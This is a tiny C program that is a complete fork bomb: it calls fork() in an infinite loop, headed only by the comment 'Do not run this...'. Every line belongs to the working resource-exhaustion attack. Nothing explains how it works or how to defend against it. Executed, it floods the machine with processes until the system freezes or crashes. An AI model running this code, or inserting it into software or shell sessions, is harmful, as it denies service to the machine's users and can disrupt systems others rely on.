#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>

// Do not run this...
int main() {
    for (;;) {
        fork();
    }
}
